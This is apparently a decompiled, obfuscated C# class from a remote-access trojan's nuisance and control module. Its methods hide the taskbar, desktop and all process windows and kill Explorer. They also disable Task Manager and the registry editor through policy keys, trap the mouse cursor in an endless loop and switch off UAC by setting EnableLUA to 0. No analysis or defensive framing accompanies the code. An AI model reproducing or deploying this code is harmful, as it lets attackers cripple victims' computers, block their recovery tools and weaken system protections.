using System;
using System.Diagnostics;
using System.Drawing;
using System.Windows.Forms;

internal class Class70
{
	public static void smethod_0(bool turnon)
	{
		//IL_0003: Unknown result type (might be due to invalid IL or missing references)
		//IL_0029: Unknown result type (might be due to invalid IL or missing references)
		if (turnon)
		{
			Class9.SendMessage(((Control)new Form()).get_Handle(), 274, (IntPtr)61808, (IntPtr)(-1));
		}
		else
		{
			Class9.SendMessage(((Control)new Form()).get_Handle(), 274, (IntPtr)61808, (IntPtr)2);
		}
	}

	public static void smethod_1(bool open)
	{
		if (open)
		{
			Class9.mciSendString("set CDAudio door open", null, 0, IntPtr.Zero);
		}
		else
		{
			Class9.mciSendString("set CDAudio door closed", null, 0, IntPtr.Zero);
		}
	}

	public static void smethod_2(bool show)
	{
		IntPtr hWnd = Class9.FindWindow("Shell_traywnd", "");
		if (show)
		{
			Class9.SetWindowPos(hWnd, IntPtr.Zero, 0, 0, 0, 0, 64u);
		}
		else
		{
			Class9.SetWindowPos(hWnd, IntPtr.Zero, 0, 0, 0, 0, 128u);
		}
	}

	public static void smethod_3(bool show)
	{
		IntPtr hWnd = ((Class9.FindWindowEx((IntPtr)0, (IntPtr)0, (IntPtr)49175, "Start") == IntPtr.Zero) ? Class9.GetWindow(Class9.FindWindow("Shell_TrayWnd", null), 5u) : Class9.FindWindowEx((IntPtr)0, (IntPtr)0, (IntPtr)49175, "Start"));
		if (show)
		{
			Class9.ShowWindow(hWnd, 1);
		}
		else
		{
			Class9.ShowWindow(hWnd, 0);
		}
	}

	public static void smethod_4(bool start)
	{
		if (start)
		{
			Process.Start("explorer.exe");
			return;
		}
		ProcessStartInfo processStartInfo = new ProcessStartInfo("taskkill", "/F /IM explorer.exe");
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		Process process = new Process();
		process.StartInfo = processStartInfo;
		process.Start();
	}

	public static void smethod_5(bool show)
	{
		IntPtr hWnd = Class9.FindWindowEx_1(Class9.FindWindowEx_1(Class9.FindWindow("Shell_TrayWnd", null), (IntPtr)0, "TrayNotifyWnd", null), (IntPtr)0, "TrayClockWClass", null);
		if (show)
		{
			Class9.ShowWindow(hWnd, 1);
		}
		else
		{
			Class9.ShowWindow(hWnd, 0);
		}
	}

	public static void smethod_6(bool show)
	{
		IntPtr hWnd = Class9.FindWindowEx_1(Class9.FindWindow("Shell_TrayWnd", null), (IntPtr)0, "TrayNotifyWnd", null);
		if (show)
		{
			Class9.ShowWindow(hWnd, 1);
		}
		else
		{
			Class9.ShowWindow(hWnd, 0);
		}
	}

	public static void smethod_7(bool show)
	{
		long num = (long)Class9.FindWindowEx_1((IntPtr)0L, (IntPtr)0L, "Progman", null);
		if (show)
		{
			Class9.ShowWindow((IntPtr)num, 5);
		}
		else
		{
			Class9.ShowWindow((IntPtr)num, 0);
		}
	}

	public static void smethod_8()
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			try
			{
				Class9.ShowWindow(process.Handle, 0);
			}
			catch
			{
			}
		}
	}

	public static void smethod_9(bool show)
	{
		if (show)
		{
			Class45.smethod_9("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\DisableTaskMgr", "0");
		}
		else
		{
			Class45.smethod_9("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\DisableTaskMgr", "1");
		}
	}

	public static void smethod_10(bool show)
	{
		if (show)
		{
			Class45.smethod_9("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\DisableRegistryTools", "0");
		}
		else
		{
			Class45.smethod_9("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\DisableRegistryTools", "1");
		}
	}

	public static void smethod_11()
	{
		while (true)
		{
			Cursor.set_Position(new Point(0, 0));
			Class9.Sleep(100);
		}
	}

	public static void smethod_12()
	{
		Class45.smethod_9("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\EnableLUA", "0");
	}
}
